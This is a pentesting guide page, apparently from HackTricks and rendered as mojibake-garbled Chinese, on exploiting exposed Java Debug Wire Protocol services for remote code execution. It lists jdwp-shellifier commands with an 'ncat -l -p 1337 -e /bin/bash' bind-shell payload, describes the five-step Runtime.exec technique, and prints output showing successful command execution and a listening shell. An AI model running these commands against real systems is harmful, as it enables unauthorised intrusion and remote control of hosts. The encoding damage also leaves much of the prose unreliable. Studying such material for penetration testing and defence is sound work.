# JDWPæ¸—é€æµ‹è¯• - Javaè°ƒè¯•çº¿åè®®

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Exploiting

ä½ å¯ä»¥ä½¿ç”¨ä½äº[https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)çš„Pythonæ¼æ´åˆ©ç”¨å·¥å…·ã€‚
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
æˆ‘å‘ç°ä½¿ç”¨`--break-on 'java.lang.String.indexOf'`å¯ä»¥ä½¿æ”»å‡»æ›´åŠ **ç¨³å®š**ã€‚å¦‚æœä½ æœ‰æœºä¼šä¸Šä¼ ä¸€ä¸ªåé—¨åˆ°ä¸»æœºå¹¶æ‰§è¡Œå®ƒï¼Œè€Œä¸æ˜¯æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œé‚£ä¹ˆæ”»å‡»å°†æ›´åŠ ç¨³å®šã€‚

é€šå¸¸ï¼Œè¿™ä¸ªè°ƒè¯•å™¨åœ¨ç«¯å£8000ä¸Šè¿è¡Œï¼Œå¦‚æœä½ ä¸è¯¥ç«¯å£å»ºç«‹ä¸€ä¸ªTCPè¿æ¥å¹¶å‘é€â€œ**JDWP-Handshake**â€ï¼ŒæœåŠ¡å™¨åº”è¯¥ç”¨ç›¸åŒçš„å­—ç¬¦ä¸²å›åº”ä½ ã€‚æ­¤å¤–ï¼Œä½ å¯ä»¥åœ¨ç½‘ç»œä¸­æ£€æŸ¥è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥æ‰¾åˆ°å¯èƒ½çš„JDWPæœåŠ¡ã€‚

å¦‚æœåœ¨ä¸€ä¸ª**javaè¿›ç¨‹**ä¸­æ‰¾åˆ°å­—ç¬¦ä¸²â€œ**jdwk**â€ï¼Œå¾ˆå¯èƒ½å®ƒå·²ç»æ¿€æ´»äº†**Java Debug Wired Protocol**ï¼Œä½ å¯èƒ½èƒ½å¤Ÿè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œç”šè‡³**æå‡æƒé™**ï¼ˆå¦‚æœä»¥rootèº«ä»½æ‰§è¡Œï¼‰ã€‚

## æ›´å¤šç»†èŠ‚

**æ‘˜è‡ª**[**https://ioactive.com/hacking-java-debug-wire-protocol-or-how/**](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)

### **Java Debug Wire Protocol**

**Java Platform Debug Architecture (JPDA)**ï¼šJDWPæ˜¯å…¨çƒJavaè°ƒè¯•ç³»ç»ŸJava Platform Debug Architecture (JPDA)\[2]çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚ä¸‹é¢æ˜¯æ•´ä½“æ¶æ„çš„å›¾ç¤ºï¼š

[![](https://ioactive.com/wp-content/uploads/2014/04/jdpa.png)](https://ioactive.com/wp-content/uploads/2014/04/jdpa-1.png)

Debuggeeç”±ä¸€ä¸ªå¤šçº¿ç¨‹çš„JVMç»„æˆï¼Œè¿è¡Œæˆ‘ä»¬çš„ç›®æ ‡åº”ç”¨ç¨‹åºã€‚ä¸ºäº†èƒ½å¤Ÿè¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼ŒJVMå®ä¾‹å¿…é¡»åœ¨å‘½ä»¤è¡Œä¸Šæ˜¾å¼åœ°ä½¿ç”¨é€‰é¡¹-Xdebugå¯åŠ¨ï¼Œå¹¶ä½¿ç”¨é€‰é¡¹-Xrunjdwpï¼ˆæˆ–-agentlibï¼‰ã€‚ä¾‹å¦‚ï¼Œå¯ç”¨è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨TomcatæœåŠ¡å™¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š

[![](https://ioactive.com/wp-content/uploads/2014/04/tomat.png)](https://ioactive.com/wp-content/uploads/2014/04/tomat-1.png)

å¦‚æ¶æ„å›¾æ‰€ç¤ºï¼ŒJava Debug Wire Protocolæ˜¯è°ƒè¯•å™¨å’ŒJVMå®ä¾‹ä¹‹é—´çš„ä¸­å¤®é“¾æ¥ã€‚å…³äºè¯¥åè®®çš„è§‚å¯Ÿç»“æœåŒ…æ‹¬ï¼š

* å®ƒæ˜¯ä¸€ä¸ªåŸºäºæ•°æ®åŒ…çš„ç½‘ç»œäºŒè¿›åˆ¶åè®®ã€‚
* å®ƒå¤§å¤šæ˜¯åŒæ­¥çš„ã€‚è°ƒè¯•å™¨å‘é€ä¸€ä¸ªå‘½ä»¤åˆ°JDWPï¼Œå¹¶æœŸæœ›æ¥æ”¶åˆ°ä¸€ä¸ªå›å¤ã€‚ç„¶è€Œï¼Œä¸€äº›å‘½ä»¤ï¼ˆå¦‚äº‹ä»¶ï¼‰ä¸éœ€è¦åŒæ­¥å“åº”ã€‚å®ƒä»¬ä¼šåœ¨ç‰¹å®šæ¡ä»¶æ»¡è¶³æ—¶å‘é€ä¸€ä¸ªå›å¤ã€‚ä¾‹å¦‚ï¼Œæ–­ç‚¹æ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚
* å®ƒä¸ä½¿ç”¨èº«ä»½éªŒè¯ã€‚
* å®ƒä¸ä½¿ç”¨åŠ å¯†ã€‚

æ‰€æœ‰è¿™äº›è§‚å¯Ÿç»“æœéƒ½æ˜¯åˆç†çš„ï¼Œå› ä¸ºæˆ‘ä»¬è°ˆè®ºçš„æ˜¯ä¸€ä¸ªè°ƒè¯•åè®®ã€‚ç„¶è€Œï¼Œå½“è¿™æ ·çš„æœåŠ¡æš´éœ²åœ¨æ•Œå¯¹ç½‘ç»œä¸Šï¼Œæˆ–è€…é¢å‘äº’è”ç½‘æ—¶ï¼Œäº‹æƒ…å¯èƒ½ä¼šå‡ºé”™ã€‚

**æ¡æ‰‹**ï¼šJDWPè§„å®š\[9]é€šä¿¡å¿…é¡»é€šè¿‡ç®€å•çš„æ¡æ‰‹æ¥åˆå§‹åŒ–ã€‚æˆåŠŸå»ºç«‹TCPè¿æ¥åï¼Œè°ƒè¯•å™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰å‘é€14ä¸ªå­—ç¬¦çš„ASCIIå­—ç¬¦ä¸²â€œJDWP-Handshakeâ€ã€‚è°ƒè¯•å¯¹è±¡ï¼ˆæœåŠ¡å™¨ï¼‰é€šè¿‡å‘é€å®Œå…¨ç›¸åŒçš„å­—ç¬¦ä¸²æ¥å“åº”è¯¥æ¶ˆæ¯ã€‚ä»¥ä¸‹æ˜¯scapy\[3]è·Ÿè¸ªæ˜¾ç¤ºçš„åˆå§‹åŒå‘æ¡æ‰‹ï¼š

root:\~/tools/scapy-hg # ip addr show dev eth0 | grep â€œinet â€œ inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0root:\~/tools/scapy-hg # ./run\_scapy

Welcome to Scapy (2.2.0-dev)\
**>>>** sniff(filter=â€tcp port 8000 and host 192.168.2.9â€³, count=8)\
\<Sniffed: TCP:9 UDP:1 ICMP:0 Other:0>\
**>>>** tcp.hexraw()\
0000 15:49:30.397814 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 S\
0001 15:49:30.402445 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 SA\
0002 15:49:30.402508 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\
0003 15:49:30.402601 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0004 15:49:30.407553 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0005 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0006 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0007 15:49:30.407636 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A

æœ‰ç»éªŒçš„å®‰å…¨å®¡è®¡å‘˜å¯èƒ½å·²ç»æ„è¯†åˆ°ï¼Œè¿™æ ·ä¸€ä¸ªç®€å•çš„æ¡æ‰‹æä¾›äº†ä¸€ç§åœ¨äº’è”ç½‘ä¸Šè½»æ¾å‘ç°æ´»åŠ¨çš„JDWPæœåŠ¡çš„æ–¹æ³•ã€‚åªéœ€å‘é€ä¸€ä¸ªç®€å•çš„æ¢æµ‹åŒ…ï¼Œå¹¶æ£€æŸ¥ç‰¹å®šçš„å“åº”ã€‚æ›´æœ‰è¶£çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ShodanHQ\[4]æ‰«ææ—¶ï¼Œè§‚å¯Ÿåˆ°äº†IBM Java Development Kitçš„è¡Œä¸ºï¼ŒæœåŠ¡å™¨é¦–å…ˆä¸ä¸Šè¿°ç›¸åŒçš„æ¨ªå¹…è¿›è¡Œâ€œå¯¹è¯â€ã€‚å› æ­¤ï¼Œå®Œå…¨ passively å‘ç°æ´»åŠ¨çš„JDWPæœåŠ¡æ˜¯å¯èƒ½çš„ï¼ˆæœ¬æ–‡ç¨åå°†ä»‹ç»å¦‚ä½•ä½¿ç”¨è‘—åçš„Shodanè¿›è¡Œï¼‰ã€‚

**é€šä¿¡**ï¼šJDWPå®šä¹‰äº†è°ƒè¯•å™¨å’Œè°ƒè¯•å¯¹è±¡ä¹‹é—´çš„é€šä¿¡æ‰€æ¶‰åŠçš„æ¶ˆæ¯\[10]ã€‚è¿™äº›æ¶ˆæ¯éµå¾ªä¸€ä¸ªç®€å•çš„ç»“æ„ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š&#x20;

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/createstring.png" alt=""><figcaption></figcaption></figure>

é•¿åº¦å’ŒIDå­—æ®µç›¸å½“æ˜æ˜¾ã€‚æ ‡å¿—å­—æ®µä»…ç”¨äºåŒºåˆ†è¯·æ±‚æ•°æ®åŒ…å’Œå›å¤æ•°æ®åŒ…ï¼Œå€¼ä¸º0x80è¡¨ç¤ºå›å¤æ•°æ®åŒ…ã€‚CommandSetå­—æ®µå®šä¹‰äº†å‘½ä»¤çš„ç±»åˆ«ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\
\\

| **CommandSet** | \*\* Command\*\*                                                                                                 |
| -------------- | ---------------------------------------------------------------------------------------------------------------- |
| 0x40           | JVMè¦æ‰§è¡Œçš„æ“ä½œï¼ˆä¾‹å¦‚è®¾ç½®æ–­ç‚¹ï¼‰                                                                                  |
| 0x40â€“0x7F      | å‘è°ƒè¯•å™¨æä¾›äº‹ä»¶ä¿¡æ¯ï¼ˆä¾‹å¦‚JVMå·²ç»è§¦å‘äº†æ–­ç‚¹ï¼Œå¹¶æ­£åœ¨ç­‰å¾…è¿›ä¸€æ­¥çš„æ“ä½œï¼‰                                           |
| 0x80           | ç¬¬ä¸‰æ–¹æ‰©å±•                                                                                                      |

è€ƒè™‘åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»¥ä¸‹å‘½ä»¤å¯¹æˆ‘ä»¬çš„ç›®çš„æœ€æœ‰è¶£ã€‚

* VirtualMachine/IDSizeså®šä¹‰äº†JVMå¤„ç†çš„æ•°æ®ç»“æ„çš„å¤§å°ã€‚è¿™æ˜¯nmapè„šæœ¬jdwp-exec.nse\[11]æ— æ³•å·¥ä½œçš„åŸå› ä¹‹ä¸€ï¼Œå› ä¸ºè¯¥è„šæœ¬ä½¿ç”¨äº†ç¡¬ç¼–ç çš„å¤§å°ã€‚
* ClassType/InvokeMethodå…è®¸æ‚¨è°ƒç”¨ä¸€ä¸ªé™æ€å‡½æ•°ã€‚
* ObjectReference/InvokeMethodå…è®¸æ‚¨è°ƒç”¨JVMä¸­å®ä¾‹åŒ–å¯¹è±¡çš„å‡½æ•°ã€‚
* StackFrame/(Get|Set)Valuesæä¾›äº†ä»çº¿ç¨‹å †æ ˆä¸­æ¨é€/å¼¹å‡ºçš„åŠŸèƒ½ã€‚
* Event/Compositeå¼ºåˆ¶JVMå¯¹æ­¤å‘½ä»¤å£°æ˜çš„ç‰¹å®šè¡Œä¸ºåšå‡ºååº”ã€‚è¯¥å‘½ä»¤æ˜¯è°ƒè¯•ç›®çš„çš„ä¸€ä¸ªé‡è¦å…³é”®ï¼Œå› ä¸ºå®ƒå…è®¸è®¾ç½®æ–­ç‚¹ï¼Œåœ¨è¿è¡Œæ—¶é€šè¿‡çº¿ç¨‹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œå¹¶åœ¨è®¿é—®/ä¿®æ”¹å€¼æ—¶ä»¥ä¸GDBæˆ–WinDBGå®Œå…¨ç›¸åŒçš„æ–¹å¼æ”¶åˆ°é€šçŸ¥ã€‚
ä¸ä»…å¯ä»¥ä½¿ç”¨JDWPè®¿é—®å’Œè°ƒç”¨å·²ç»é©»ç•™åœ¨å†…å­˜ä¸­çš„å¯¹è±¡ï¼Œè¿˜å¯ä»¥åˆ›å»ºæˆ–è¦†ç›–æ•°æ®ã€‚

* VirtualMachine/CreateStringå…è®¸å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåœ¨JVMè¿è¡Œæ—¶ä¸­å­˜åœ¨çš„java.lang.Stringã€‚
* VirtualMachine/RedefineClasseså…è®¸å®‰è£…æ–°çš„ç±»å®šä¹‰ã€‚

**â€œæˆ‘ä»¬æ‹¥æœ‰ä½ çš„JDWPâ€**

æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼ŒJDWPæä¾›äº†å†…ç½®å‘½ä»¤ï¼Œå¯ä»¥å°†ä»»æ„ç±»åŠ è½½åˆ°JVMå†…å­˜ä¸­ï¼Œå¹¶è°ƒç”¨å·²ç»å­˜åœ¨å’Œ/æˆ–æ–°åŠ è½½çš„å­—èŠ‚ç ã€‚ä¸‹é¢çš„éƒ¨åˆ†å°†ä»‹ç»åœ¨Pythonä¸­åˆ›å»ºåˆ©ç”¨ä»£ç çš„æ­¥éª¤ï¼Œè¯¥ä»£ç ä½œä¸ºJDIå‰ç«¯çš„éƒ¨åˆ†å®ç°ï¼Œä»¥å°½å¯èƒ½å¯é ã€‚ç‹¬ç«‹çš„åˆ©ç”¨è„šæœ¬çš„ä¸»è¦åŸå› æ˜¯ï¼Œä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæˆ‘å–œæ¬¢â€œä¸€å‡»å¿…æ€â€çš„åˆ©ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ç¡®å®šä¸€ä¸ªç¯å¢ƒ/åº”ç”¨ç¨‹åº/åè®®å­˜åœ¨æ¼æ´æ—¶ï¼Œæˆ‘å¸Œæœ›ç«‹å³å‡†å¤‡å¥½åˆ©ç”¨å®ƒçš„å·¥å…·ï¼ˆå³æ²¡æœ‰PoCï¼Œè¿™åŸºæœ¬ä¸Šæ˜¯è¿„ä»Šä¸ºæ­¢å”¯ä¸€å­˜åœ¨çš„ä¸œè¥¿ï¼‰ã€‚æ‰€ä»¥ç°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº†ç†è®ºçŸ¥è¯†ï¼Œè®©æˆ‘ä»¬è¿›å…¥å®é™…å®ç°ã€‚å½“é¢å¯¹ä¸€ä¸ªå¼€æ”¾çš„JDWPæœåŠ¡æ—¶ï¼Œä»»æ„å‘½ä»¤æ‰§è¡Œåªæœ‰äº”ä¸ªæ­¥éª¤ä¹‹é¥ï¼ˆæˆ–è€…ä½¿ç”¨è¿™ä¸ªåˆ©ç”¨ï¼Œåªéœ€è¦ä¸€æ¡å‘½ä»¤è¡Œï¼‰ã€‚ä¸‹é¢æ˜¯å…·ä½“æ­¥éª¤ï¼š1. è·å–Java Runtimeå¼•ç”¨JVMé€šè¿‡å¼•ç”¨æ¥æ“ä½œå¯¹è±¡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨å¿…é¡»é¦–å…ˆè·å–å¯¹java.lang.Runtimeç±»çš„å¼•ç”¨ã€‚ä»è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹getRuntime()æ–¹æ³•çš„å¼•ç”¨ã€‚è¿™æ˜¯é€šè¿‡è·å–æ‰€æœ‰ç±»ï¼ˆAllClassesæ•°æ®åŒ…ï¼‰å’Œæˆ‘ä»¬æ­£åœ¨æŸ¥æ‰¾çš„ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼ˆReferenceType/Methodsæ•°æ®åŒ…ï¼‰æ¥å®Œæˆçš„ã€‚2. è®¾ç½®æ–­ç‚¹å¹¶ç­‰å¾…é€šçŸ¥ï¼ˆå¼‚æ­¥è°ƒç”¨ï¼‰è¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„å…³é”®ã€‚ä¸ºäº†è°ƒç”¨ä»»æ„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦å¤„äºè¿è¡Œçº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­ã€‚ä¸ºæ­¤ï¼Œä¸€ä¸ªæŠ€å·§æ˜¯åœ¨å·²çŸ¥åœ¨è¿è¡Œæ—¶è°ƒç”¨çš„æ–¹æ³•ä¸Šè®¾ç½®æ–­ç‚¹ã€‚å¦‚å‰æ‰€è¿°ï¼ŒJDIä¸­çš„æ–­ç‚¹æ˜¯ä¸€ä¸ªå¼‚æ­¥äº‹ä»¶ï¼Œå…¶ç±»å‹è®¾ç½®ä¸ºBREAKPOINT(0x02)ã€‚å½“å‘½ä¸­æ—¶ï¼ŒJVMä¼šå‘æˆ‘ä»¬çš„è°ƒè¯•å™¨å‘é€ä¸€ä¸ªEventDataæ•°æ®åŒ…ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬çš„æ–­ç‚¹IDï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå‘½ä¸­å®ƒçš„çº¿ç¨‹çš„å¼•ç”¨ã€‚

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/event_break.png" alt=""><figcaption></figcaption></figure>

å› æ­¤ï¼Œå°†å…¶è®¾ç½®åœ¨ç»å¸¸è°ƒç”¨çš„æ–¹æ³•ä¸Šæ˜¯ä¸ªå¥½ä¸»æ„ï¼Œæ¯”å¦‚java.net.ServerSocket.accept()ï¼Œæ¯æ¬¡æœåŠ¡å™¨æ¥æ”¶åˆ°æ–°çš„ç½‘ç»œè¿æ¥æ—¶éƒ½å¾ˆå¯èƒ½è°ƒç”¨è¯¥æ–¹æ³•ã€‚ç„¶è€Œï¼Œå¿…é¡»è®°ä½å®ƒå¯ä»¥æ˜¯è¿è¡Œæ—¶å­˜åœ¨çš„ä»»ä½•æ–¹æ³•ã€‚3. åœ¨Runtimeä¸­åˆ†é…Java Stringå¯¹è±¡ä»¥æ‰§è¡Œæœ‰æ•ˆè½½è·æˆ‘ä»¬å°†åœ¨JVMè¿è¡Œæ—¶ä¸­æ‰§è¡Œä»£ç ï¼Œå› æ­¤æˆ‘ä»¬æ“ä½œçš„æ‰€æœ‰æ•°æ®ï¼ˆå¦‚å­—ç¬¦ä¸²ï¼‰å¿…é¡»å­˜åœ¨äºJVMè¿è¡Œæ—¶ä¸­ï¼ˆå³å…·æœ‰è¿è¡Œæ—¶å¼•ç”¨ï¼‰ã€‚é€šè¿‡å‘é€CreateStringå‘½ä»¤å¾ˆå®¹æ˜“å®ç°è¿™ä¸€ç‚¹ã€‚

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/Untitled.png" alt=""><figcaption></figcaption></figure>

4. ä»æ–­ç‚¹ä¸Šä¸‹æ–‡ä¸­è·å–Runtimeå¯¹è±¡æ­¤æ—¶ï¼Œæˆ‘ä»¬å‡ ä¹æ‹¥æœ‰äº†æˆåŠŸã€å¯é çš„åˆ©ç”¨æ‰€éœ€çš„æ‰€æœ‰å…ƒç´ ã€‚æˆ‘ä»¬ç¼ºå°‘çš„æ˜¯ä¸€ä¸ªRuntimeå¯¹è±¡å¼•ç”¨ã€‚è·å–å®ƒå¾ˆå®¹æ˜“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨JVMè¿è¡Œæ—¶ä¸­æ‰§è¡Œjava.lang.Runtime.getRuntime()é™æ€æ–¹æ³•\[8]ï¼Œå‘é€ClassType/InvokeMethodæ•°æ®åŒ…å¹¶æä¾›Runtimeç±»å’Œçº¿ç¨‹å¼•ç”¨æ¥å®ç°ã€‚5. åœ¨Runtimeå®ä¾‹ä¸­æŸ¥æ‰¾å¹¶è°ƒç”¨exec()æ–¹æ³•æœ€åä¸€æ­¥å°±æ˜¯åœ¨å‰ä¸€æ­¥è·å¾—çš„Runtimeé™æ€å¯¹è±¡ä¸­æŸ¥æ‰¾exec()æ–¹æ³•ï¼Œå¹¶è°ƒç”¨å®ƒï¼ˆé€šè¿‡å‘é€ObjectReference/InvokeMethodæ•°æ®åŒ…ï¼‰ï¼Œä½¿ç”¨æˆ‘ä»¬åœ¨ç¬¬ä¸‰æ­¥åˆ›å»ºçš„Stringå¯¹è±¡ã€‚

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/exec.png" alt=""><figcaption></figcaption></figure>

Et voilÃ !! å¿«é€Ÿè€Œç®€å•ã€‚ä½œä¸ºæ¼”ç¤ºï¼Œè®©æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå¯ç”¨äº†JPDAâ€œè°ƒè¯•æ¨¡å¼â€çš„Tomcatï¼š

root@pwnbox:\~/apache-tomcat-6.0.39# ./bin/catalina.sh jpda start

æˆ‘ä»¬æ‰§è¡Œè„šæœ¬è€Œä¸å¸¦ä»»ä½•è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œåªæ˜¯ä¸ºäº†è·å–ä¸€èˆ¬çš„ç³»ç»Ÿä¿¡æ¯ï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.9
[+] Targeting â€˜192.168.2.9:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) 64-Bit Server VM â€“ 1.6.0_65â€™
[+] Found Runtime class: id=466[+] Found Runtime.getRuntime(): id=7facdb6a8038
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™## Here we wait for breakpoint to be triggered by a new connection ##
[+] Received matching event from thread 0x8b0
[+] Found Operating System â€˜Mac OS Xâ€™
[+] Found User name â€˜pentestosxâ€™
[+] Found ClassPath â€˜/Users/pentestosx/Desktop/apache-tomcat-6.0.39/bin/bootstrap.jarâ€™
[+] Found User home directory â€˜/Users/pentestosxâ€™
[!] Command successfully executed
```
ç›¸åŒçš„å‘½ä»¤è¡Œï¼Œä½†é’ˆå¯¹Windowsç³»ç»Ÿï¼Œå¹¶åœ¨å®Œå…¨ä¸åŒçš„æ–¹æ³•ä¸Šä¸­æ–­ï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“break-on â€˜java.lang.String.indexOfâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) Client VM â€“ 1.7.0_51â€™
[+] Found Runtime class: id=593
[+] Found Runtime.getRuntime(): id=17977a9c
[+] Created break event id=2
[+] Waiting for an event on â€˜java.lang.String.indexOfâ€™
[+] Received matching event from thread 0x8f5
[+] Found Operating System â€˜Windows 7â€™
[+] Found User name â€˜hugsyâ€™
[+] Found ClassPath â€˜C:UsershugsyDesktopapache-tomcat-6.0.39binbootstrap.jarâ€™
[+] Found User home directory â€˜C:Usershugsyâ€™
[!] Command successfully executed
```
æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„åˆ©ç”¨ç¨‹åºï¼Œåœ¨Linuxç³»ç»Ÿä¸Šç”Ÿæˆä¸€ä¸ªç»‘å®šshellï¼Œä½¿ç”¨æœ‰æ•ˆè½½è·â€œncat -e /bin/bash -l -p 1337â€ï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“cmd â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜OpenJDK Client VM â€“ 1.6.0_27â€™
[+] Found Runtime class: id=79d
[+] Found Runtime.getRuntime(): id=8a1f5e0
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™
[+] Received matching event from thread 0x82a[+] Selected payload â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Command string object created id:82b
[+] Runtime.getRuntime() returned context id:0x82c
[+] found Runtime.exec(): id=8a1f5fc[+] Runtime.exec() successful, retId=82d
[!] Command successfully executed Success, we now have a listening socket!
root@pwnbox:~/apache-tomcat-6.0.39# netstat -ntpl | grep 1337
tcp        0      0 0.0.0.0:1337         0.0.0.0:*               LISTEN      19242/ncat
tcp6       0      0 :::1337              :::*                    LISTEN      19242/ncat
```
æœ€ç»ˆçš„æ”»å‡»åˆ©ç”¨äº†è¿™äº›æŠ€æœ¯ï¼Œå¹¶æ·»åŠ äº†ä¸€äº›æ£€æŸ¥ï¼Œå¹¶å‘é€æŒ‚èµ·/æ¢å¤ä¿¡å·ï¼Œä»¥å°½å¯èƒ½å°‘åœ°é€ æˆå¹²æ‰°ï¼ˆæœ€å¥½ä¸è¦ç ´åä½ æ­£åœ¨å·¥ä½œçš„åº”ç”¨ç¨‹åºï¼Œå¯¹å§ï¼Ÿï¼‰ã€‚å®ƒæœ‰ä¸¤ç§æ¨¡å¼ï¼š

* â€œé»˜è®¤â€æ¨¡å¼å®Œå…¨ä¸ä¼šå¹²æ‰°ï¼Œåªæ˜¯æ‰§è¡ŒJavaä»£ç ä»¥è·å–æœ¬åœ°ç³»ç»Ÿä¿¡æ¯ï¼ˆéå¸¸é€‚åˆå‘å®¢æˆ·æä¾›PoCï¼‰ã€‚
* é€šè¿‡ä¼ é€’â€œcmdâ€é€‰é¡¹ï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå› æ­¤æ›´å…·ä¾µå…¥æ€§ã€‚å‘½ä»¤æ˜¯ä½¿ç”¨JVMæ­£åœ¨è¿è¡Œçš„ç‰¹æƒæ‰§è¡Œçš„ã€‚

è¿™ä¸ªæ”»å‡»è„šæœ¬å·²æˆåŠŸæµ‹è¯•è¿‡ï¼š

* Oracle Java JDK 1.6å’Œ1.7
* OpenJDK 1.6
* IBM JDK 1.6

ç”±äºJavaåœ¨è®¾è®¡ä¸Šæ˜¯è·¨å¹³å°çš„ï¼Œå¯ä»¥åœ¨Javaæ”¯æŒçš„ä»»ä½•æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚å¯¹äºæˆ‘ä»¬æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸ªå¥½æ¶ˆæ¯ï¼š**å¼€æ”¾çš„JDWPæœåŠ¡æ„å‘³ç€å¯é çš„è¿œç¨‹ä»£ç æ‰§è¡Œ**ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¸€åˆ‡é¡ºåˆ©ã€‚

